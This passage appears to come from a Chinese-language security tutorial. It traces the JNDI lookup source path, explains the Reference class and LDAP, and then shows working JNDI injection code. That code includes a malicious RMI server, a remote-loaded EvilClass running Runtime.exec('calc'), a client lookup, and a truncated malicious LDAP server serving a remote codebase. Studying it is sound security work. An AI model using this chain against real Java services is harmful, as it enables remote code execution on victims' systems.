RegistryContextFactory#URLToContext(String, Hashtable&lt;?, ?&gt;)</span><br><span class="line">   rmiURLContextFactory#getObjectInstance(Object, Name, Context, Hashtable&lt;?, ?&gt;)</span><br><span class="line">   rmiURLContextFactory#getUsingURL(String, Hashtable&lt;?, ?&gt;)</span><br><span class="line">   GenericURLContext#lookup(String)</span><br><span class="line">   -&gt; rmiURLContext#getRootURLContext(String, Hashtable&lt;?, ?&gt;)</span><br><span class="line">      RegistryContext#RegistryContext(String, int, Hashtable&lt;?, ?&gt;)</span><br><span class="line">      RegistryContext#getRegistry(String, int, RMIClientSocketFactory)</span><br><span class="line">      LocateRegistry#getRegistry(String, int) # 获取 RegistryImpl_Stub 对象 </span><br><span class="line">   -&gt; RegistryContext#lookup(Name)</span><br><span class="line">      RegistryImpl_Stub#lookup(String) # 进一步解析剩余路径</span><br></pre></td></tr></table></figure><h4 id="查找远程对象"><a href="#查找远程对象" class="headerlink" title="查找远程对象"></a>查找远程对象</h4><p>跟进 initialContext.lookup 方法：</p><img src="/images/QQ_1725106323011.png"><p>这里是先调用 getURLOrDefaultInitCtx 方法获取一个对象，然后再调用该对象的 lookup 方法。</p><p>跟进 InitialContext 的 getURLOrDefaultInitCtx 方法：</p><img src="/images/QQ_1725106511808.png"><p>第一步调用 NamingManager.hasInitialContextFactoryBuilder 检查是否已经存在一个初始上下文工厂构建器，这一步是没有的，不进入判断。</p><p>继续往下，调用 getURLScheme 提取传入字符串的 URL 链接开头部分，比如 “rmi”，”ldap” ：</p><img src="/images/QQ_1725106983919.png"><p>因为字符串并不包含 URL 部分，所以这里返回空。</p><p>既然返回空值的话，就不会进入判断了，最后调用 getDefaultInitCtx 方法并返回。</p><p>跟进 InitialContext 的 getDefaultInitCtx 方法：</p><img src="/images/QQ_1725107374037.png"><p>这个方法先前在初始化上下文的时候已经进入过一次，将 gotDefault 设置为 true ，所以直接返回。</p><p>这里的 defaultInitCtx 是 RegistryContext 对象：</p><img src="/images/QQ_1725109973809.png"><p>所以返回后就进入 RegistryContext 的 lookup 方法：</p><img src="/images/QQ_1725110084570.png"><p>这里就继续调用了 RegistryContext#lookup(Name) 方法，跟进它：</p><img src="/images/QQ_1725110150913.png"><p>之后的路子就熟了，依然是调用 RegistryImpl_Stub 的 lookup 方法。</p><h6 id="调用链总结-1"><a href="#调用链总结-1" class="headerlink" title="调用链总结"></a>调用链总结</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">initialContext#lookup(String)</span><br><span class="line">-&gt; initialContext#getURLOrDefaultInitCtx(String)</span><br><span class="line">        -&gt; initialContext#getURLScheme(String) # 获取协议部分</span><br><span class="line">           NamingManager#getURLContext(String, Hashtable&lt;?,?&gt;)</span><br><span class="line">        -&gt; initialContext#getDefaultInitCtx() # 获取 RegistryContext 对象</span><br><span class="line">    -&gt; RegistryContext#lookup(String)</span><br><span class="line">       RegistryContext#lookup(Name)</span><br><span class="line">       RegistryImpl_Stub#lookup(Name) # 查找远程对象</span><br></pre></td></tr></table></figure><h4 id="JNDI-动态协议转换"><a href="#JNDI-动态协议转换" class="headerlink" title="JNDI 动态协议转换"></a>JNDI 动态协议转换</h4><h6 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h6><p>事实上，在查找远程对象的时候，可以直接传入完整的 URL 链接，这样它会自动调用对应的协议，请求对应的地址，而不需要再手动设置属性，客户端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //初始化上下文</span><br><span class="line">        Context initialContext = new InitialContext();</span><br><span class="line">        //调用远程类</span><br><span class="line">        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup(&quot;rmi://127.0.0.1:1099/SayHello&quot;);</span><br><span class="line">        System.out.println(sayhello.function(&quot;test&quot;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然这是一种更简便的 JNDI 调用方式。</p><h6 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h6><p>在查找远程对象时，通过 InitialContext 的 getURLScheme 方法就能提取出其中的协议部分：</p><img src="/images/QQ_1725107852805.png"><p>这时获取到的 scheme 就是字符串 “rmi” 。</p><p>随后调用 NamingManager.getURLContext 方法，跟进它：</p><img src="/images/QQ_1725108263515.png"><p>调用 NamingManager 的 getURLObject 方法，继续跟进：</p><img src="/images/QQ_1725109108360.png"><p>最核心的就是通过 ResourceManager.getFactory 方法获取一个工厂类对象，这里获取的对象是由传入的 scheme 决定的，对象的类名就是 scheme + “URLContextFactory” ，那么这里获取到的是 rmiURLContextFactory 对象。</p><p>最后调用 factory.getObjectInstance 获取了一个 rmiURLContext 对象并将其返回：</p><img src="/images/QQ_1725109173862.png"><p>那么回到 InitialContext 的 getURLOrDefaultInitCtx 方法，最后返回的就是这个 rmiURLContext 对象：</p><img src="/images/QQ_1725109284349.png"><p>所以之后调用的是 rmiURLContext 的 lookup 方法：</p><img src="/images/QQ_1725109301609.png"><p>然而 rmiURLContext 并没有重写 lookup 方法，所以调用的是父类 GenericURLContext 的 lookup 方法。</p><p>后续的流程跟前面是一样的。</p><h6 id="调用链总结-2"><a href="#调用链总结-2" class="headerlink" title="调用链总结"></a>调用链总结</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">initialContext#lookup(String)</span><br><span class="line">-&gt; initialContext#getURLOrDefaultInitCtx(String)</span><br><span class="line">       -&gt; initialContext#getURLScheme(String) # 获取协议部分</span><br><span class="line">       -&gt; NamingManager#getURLContext(String, Hashtable&lt;?,?&gt;)</span><br><span class="line">          NamingManager#getURLObject(String, Object, Name, Context, Hashtable&lt;?,?&gt;)</span><br><span class="line">          ResourceManager#getFactory(String, Hashtable&lt;?,?&gt;, Context, String, String)</span><br><span class="line">          rmiURLContextFactory#getObjectInstance(Object, Name, Context, Hashtable&lt;?, ?&gt;)</span><br><span class="line">          rmiURLContext#rmiURLContext(Hashtable&lt;?, ?&gt;) # 获取 rmiURLContext 对象</span><br><span class="line">    -&gt; GenericURLContext#lookup(String)</span><br><span class="line">       -&gt; rmiURLContext#getRootURLContext(String, Hashtable&lt;?, ?&gt;)</span><br><span class="line">      RegistryContext#RegistryContext(String, int, Hashtable&lt;?, ?&gt;)</span><br><span class="line">      RegistryContext#getRegistry(String, int, RMIClientSocketFactory)</span><br><span class="line">      LocateRegistry#getRegistry(String, int) # 获取 RegistryImpl_Stub 对象 </span><br><span class="line">   -&gt; RegistryContext#lookup(Name)</span><br><span class="line">      -&gt; RegistryImpl_Stub#lookup(String) # 获取远程对象</span><br><span class="line">      -&gt; RegistryContext#decodeObject(Remote, Name)</span><br><span class="line">         NamingManager#getObjectInstance(Object, Name, Context, Hashtable&lt;?,?&gt;) # 实例化远程对象</span><br></pre></td></tr></table></figure><h2 id="JNDI-Reference-类"><a href="#JNDI-Reference-类" class="headerlink" title="JNDI Reference 类"></a>JNDI Reference 类</h2><p>在 JNDI 中，Reference 类用于表示对那些不直接存储在命名或目录系统中的对象的引用。也就是说，当对象本身无法被序列化并存储在目录中时，Reference 提供了一种方式，通过包含足够的信息以便在需要时重新构建该对象。</p><p>例如，当你通过 RMI（远程方法调用）获取一个远程服务上的对象时，客户端实际上得到的是一个对象的存根（stub）。这个对象本身可能并不直接存在于客户端的命名或目录系统中，但通过 Reference ，客户端可以包含必要的信息，从其他服务器加载类文件并实例化对象。</p><p>Reference 类位于 javax.naming 包中，主要有以下几个构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Reference(String className, String factory, String factoryLocation)</span><br><span class="line">public Reference(String className)</span><br><span class="line">public Reference(String className, Vector&lt;RefAddr&gt; addrs, String factory, String factoryLocation)</span><br></pre></td></tr></table></figure><p>参数解释：</p><ol><li>类名（Class Name）：指定了引用的对象的完全限定类名。它告诉 JNDI 在实例化对象时需要加载哪个类。</li><li>工厂类名（Factory Class Name）：指定了用于重新构建对象的工厂类。这个工厂类必须实现 javax.naming.spi.ObjectFactory 接口。</li><li>地址列表（Address List）：包含了一组 RefAddr（引用地址），这些地址携带了重建对象所需的各种信息。常见的 RefAddr 子类包括 StringRefAddr 、SerialRefAddr 等。</li></ol><h2 id="LDAP-协议"><a href="#LDAP-协议" class="headerlink" title="LDAP 协议"></a>LDAP 协议</h2><p>LDAP（Lightweight Directory Access Protocol，轻量级目录访问协议）是一种应用层协议，用于访问和维护分布式目录信息服务，其默认端口是 389 。LDAP 广泛应用于目录服务中，用于查询和管理用户、设备、应用程序等信息。LDAP 通常用于验证用户身份，并存储与组织、用户及其他资源相关的详细信息。</p><h6 id="LDAP-协议的基本概念"><a href="#LDAP-协议的基本概念" class="headerlink" title="LDAP 协议的基本概念"></a>LDAP 协议的基本概念</h6><ol><li><p><strong>目录服务</strong>: 目录服务是一个存储和组织数据的分层结构，类似于文件系统中的目录结构。它存储有关用户、计算机、网络资源等的信息，并允许用户和应用程序通过 LDAP 协议来查询和管理这些信息。</p></li><li><p><strong>条目（Entry）</strong>: LDAP 目录中的基本数据单位，每个条目由一组属性及其对应的值组成。每个条目都有一个唯一的区分名称（Distinguished Name, DN），用来唯一标识条目在目录树中的位置。</p></li><li><p><strong>区分名称（DN）</strong>: DN 是 LDAP 中条目的唯一标识符。它类似于文件路径，包含了从根到条目的所有层次信息。DN 由多个相对区分名称（RDN, Relative Distinguished Name）组成。</p><p>例如，“uid&#x3D;john.doe” 表示由名为 “uid” 且值为 “john.doe” 的属性组成的 RDN 。如果 RDN 有多个属性值对，则用加号分隔，例如 “givenName&#x3D;John+sn&#x3D;Doe” ；</p><p>一个 DN 通常由多个 RDN 组成，例如，DN “uid&#x3D;john.doe,ou&#x3D;People,dc&#x3D;example,dc&#x3D;com” 有四个 RDN ；</p><p>右边的范围比左边的范围大，左边的 RDN 是右边 RDN 的子集，例如，DN “uid&#x3D;john.doe,ou&#x3D;People,dc&#x3D;example,dc&#x3D;com” 的父 DN 为 “ou&#x3D;People,dc&#x3D;example,dc&#x3D;com” 。</p></li><li><p><strong>属性（Attribute）</strong>: 每个条目由若干属性组成，属性包含属性类型和属性值。例如，cn（common name, 通用名）、mail（电子邮件地址）、uid（用户ID）等都是属性类型，属性值则是对应的实际数据。</p></li><li><p><strong>对象类（Object Class）</strong>: 每个 LDAP 条目都有一个或多个对象类，定义了条目中允许出现的属性类型。对象类决定了条目的结构和内容。常见的对象类包括 inetOrgPerson 、organizationalUnit 等。</p></li></ol><h6 id="LDAP-数据模型"><a href="#LDAP-数据模型" class="headerlink" title="LDAP 数据模型"></a>LDAP 数据模型</h6><p>LDAP 采用树状结构（即目录信息树，DIT）来组织和存储数据。树的每个节点代表一个条目，条目之间的层次关系由它们的DN来表示。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dc=example,dc=com</span><br><span class="line">├── ou=People</span><br><span class="line">│   ├── cn=John Doe</span><br><span class="line">│   ├── cn=Jane Smith</span><br><span class="line">├── ou=Groups</span><br><span class="line">│   ├── cn=Admins</span><br></pre></td></tr></table></figure><ul><li><code>dc=example,dc=com</code>：目录的根条目，<code>dc</code> 表示域组件（Domain Component）。</li><li><code>ou=People</code>：表示一个组织单元（Organizational Unit），用于存放用户信息。</li><li><code>cn=John Doe</code>：表示用户 “John Doe” 的条目，<code>cn</code> 表示通用名（Common Name）。</li></ul><h6 id="LDAP-协议操作"><a href="#LDAP-协议操作" class="headerlink" title="LDAP 协议操作"></a>LDAP 协议操作</h6><p>LDAP 协议定义了多个操作来查询和管理目录中的条目。主要操作包括：</p><ol><li><strong>绑定（Bind）</strong>: 客户端与 LDAP 服务器建立连接并进行身份验证。绑定操作可以是匿名的，也可以使用用户名和密码进行身份验证。</li><li><strong>搜索（Search）</strong>: 客户端可以在目录中搜索特定的条目，搜索操作可以通过指定 DN 、搜索范围、过滤条件等来精确查找。</li><li><strong>比较（Compare）</strong>: 比较操作用于检查某个条目中的某个属性值是否与给定值匹配。</li><li><strong>添加（Add）</strong>: 向目录中添加新的条目。</li><li><strong>删除（Delete）</strong>: 删除指定的条目。</li><li><strong>修改（Modify）</strong>: 修改条目的属性，可以添加、删除或替换属性值。</li><li><strong>修改 DN（Modify DN）</strong>: 改变条目的 DN ，从而改变条目在目录树中的位置。</li><li><strong>解除绑定（Unbind）</strong>: 客户端通知 LDAP 服务器终止会话，关闭连接。</li></ol><h6 id="LDAP-报文结构"><a href="#LDAP-报文结构" class="headerlink" title="LDAP 报文结构"></a>LDAP 报文结构</h6><p>LDAP 协议是基于 TCP&#x2F;IP 的，其消息结构通常使用 BER（Basic Encoding Rules）编码。下面是 LDAP 请求和响应消息中的一些主要字段：</p><ol><li><strong>消息 ID</strong>：每个 LDAP 消息都有一个唯一的消息 ID ，用于在请求和响应之间进行匹配。</li><li><strong>操作代码</strong>：指示 LDAP 消息的类型，例如 <code>BindRequest</code>、<code>SearchRequest</code>、<code>ModifyRequest</code> 等。</li><li><strong>DN（Distinguished Name）</strong>：用于指定操作所作用的目标条目。</li><li><strong>属性和值</strong>：用于指定要查询、添加、修改或删除的属性及其值。</li><li><strong>搜索范围</strong>：用于指定搜索操作的范围，如 <code>base</code> 、<code>oneLevel</code> 、<code>subtree</code> 。</li><li><strong>过滤器（Filter）</strong>：在搜索操作中使用的过滤条件，用于限定搜索结果，例如 <code>(cn=John Doe)</code> 表示查询 <code>cn</code> 属性等于 “John Doe” 的条目。</li><li><strong>结果代码（Result Code）</strong>：LDAP响应消息中的结果代码，用于表示操作的结果，如 <code>success</code>（成功）、<code>noSuchObject</code>（无此对象）、<code>invalidCredentials</code>（凭证无效）等。</li></ol><h6 id="LDAP-主要字段含义"><a href="#LDAP-主要字段含义" class="headerlink" title="LDAP 主要字段含义"></a>LDAP 主要字段含义</h6><p>以下是 LDAP 消息中常见字段的含义：</p><ul><li><strong>messageID</strong>：区分每个 LDAP 操作的标识符，确保请求和响应能够正确对应。</li><li><strong>protocolOp</strong>：指示 LDAP 操作类型，如 <code>bindRequest</code>、<code>searchRequest</code> 等。</li><li><strong>dn</strong>：目标条目的 DN 。</li><li><strong>attributes</strong>：在 LDAP 操作中，定义要添加、修改、删除或查询的属性名称和属性值。</li><li><strong>filter</strong>：在 <code>searchRequest</code> 中定义的过滤器，用于指定搜索的条件。</li><li><strong>resultCode</strong>：操作结果的状态码，标示操作成功或失败的类型。</li></ul><p>比如一个请求消息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LDAPMessage &#123;</span><br><span class="line">    messageID: 1</span><br><span class="line">    protocolOp: bindRequest &#123;</span><br><span class="line">        version: 3</span><br><span class="line">        name: &quot;cn=admin,dc=example,dc=com&quot;</span><br><span class="line">        authentication: simple &#123;</span><br><span class="line">            credentials: &quot;admin_password&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的响应信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LDAPMessage &#123;</span><br><span class="line">    messageID: 1</span><br><span class="line">    protocolOp: bindResponse &#123;</span><br><span class="line">        resultCode: success (0)</span><br><span class="line">        matchedDN: &quot;&quot;</span><br><span class="line">        diagnosticMessage: &quot;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>LDAP 是一种用于访问和管理目录服务的协议。它通过一系列操作来允许客户端查询和管理目录中的条目，每个条目由一组属性组成，并使用 DN 进行唯一标识。LDAP 协议的灵活性和广泛应用使其成为身份验证、访问控制等领域的标准协议之一。</p><h2 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h2><p>JNDI 注入的前提是能操作客户端 lookup 方法或其他远程操作方法的参数。</p><h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI + RMI"></a>JNDI + RMI</h4><p>实现方法很简单，我们先在 RMI 服务器上绑定一个 Reference 类，服务端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class JndiRmiTest &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, AlreadyBoundException, InterruptedException, NamingException &#123;</span><br><span class="line">        // 创建一个 Reference 对象</span><br><span class="line">        Reference reference = new Reference(&quot;EvilClass&quot;, &quot;EvilClass&quot;, &quot;http://127.0.0.1:8002/&quot;);</span><br><span class="line">        // 用 ReferenceWrapper 包装 Reference 对象，使其继承 UnicastRemoteObject 类</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        // 将 RMI 服务注册到 1099 端口</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        // 绑定 Reference 对象</span><br><span class="line">        registry.rebind(&quot;EvilClass&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面说了 Reference 构造方法的三个参数，那么就知道这个 EvilClass 就是 Reference 中指定的远程类名，EvilClass 同时也作为工厂类名，所以它要实现 javax.naming.spi.ObjectFactory 接口。EvilClass 代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class EvilClass implements ObjectFactory &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外我们知道，要在 RMI 服务上绑定远程对象，这个远程对象需要继承 UnicastRemoteObject 类，那么可以将 Reference 对象封装进 ReferenceWrapper 中，使其继承 UnicastRemoteObject 类，可以看一下 ReferenceWrapper 的定义：</p><img src="/images/image-20240903130853020.png"><p>需要注意的是：com.sun.jndi.rmi.registry.ReferenceWrapper 在新版本的 JDK 中被移除，需要额外引入对应 jar 包。这里的 JDK 版本为 8u71。</p><p>最后是客户端代码，只要去请求 RMI 服务端即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">//初始化上下文</span><br><span class="line">        Context initialContext = new InitialContext();</span><br><span class="line">        //调用远程类</span><br><span class="line">        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup(&quot;rmi://127.0.0.1:1099/EvilClass&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reference 对象会先去本地查找对应的类是否存在，如果不存在，才会去 factoryLocation 指定的 URL 查找。故而为了体现出是远程加载，我将 EvilClass.class 文件放在其他目录下，再利用 python 开启 http 服务器（注意，此时客户端是不能直接访问到 EvilClass 类的）。</p><p>先开启 http 服务器，再开启 rmi 服务端，最后开启客户端，成功弹出计算器，并且 http 服务器上有对应的日志记录：</p><img src="/images/image-20240903205544943.png"><p>原理就是客户端去请求了 RMI 服务端地址，获取了 ReferenceWrapper 对象，然后又根据其中封装的 Reference 对象的 factoryLocation 属性去请求了远程对象所在的地址，最终造成客户端反序列化。</p><h4 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI + LDAP"></a>JNDI + LDAP</h4><p>LDAP 服务端需要设置好如下的四个属性，代表远程对象的引用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ObjectClass: javaNamingReference</span><br><span class="line">javaCodebase: http://localhost:5000/</span><br><span class="line">JavaFactory: EvilClass</span><br><span class="line">javaClassName: FooBar</span><br></pre></td></tr></table></figure><p>这其实也是 Reference 类的一种利用方式。</p><p>我们利用 Java 开启一个 LDAP 服务器，需要的依赖如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- UnboundID LDAP SDK --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;6.0.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>LDAP 服务端代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">public class ldapServer &#123;</span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line">    public static void main (String[] args) &#123;</span><br><span class="line">        String url = &quot;http://127.0.0.1:8002/#EvilClass&quot;;</span><br><span class="line">        int port = 10389;</span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;,</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line">        private URL codebase;</span><br><span class="line">        /**</span><br><span class="line">         * */ public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line">        /**</span><br><span class="line">         * &#123;@inheritDoc&#125;</span><br><span class="line">         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="line">         */ @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, 